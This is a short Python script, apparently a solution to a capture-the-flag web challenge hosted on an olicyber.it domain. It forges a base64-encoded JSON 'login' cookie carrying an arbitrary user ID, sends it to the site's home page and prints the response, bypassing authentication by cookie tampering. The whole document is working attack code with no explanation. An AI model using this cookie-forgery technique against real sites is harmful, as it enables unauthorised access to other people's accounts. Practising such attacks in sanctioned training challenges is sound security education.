import requests
import base64
import random
from bs4 import BeautifulSoup

urlbase = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'
s = requests.Session()
id_str = '{"ID":' + str(-105) + '}'
base64_id = base64.b64encode(id_str.encode('utf-8')).decode('ascii')
s.cookies.update({"login": base64_id})
r=s.get(urlbase + 'home.php')
print(s.cookies)
print(r.text)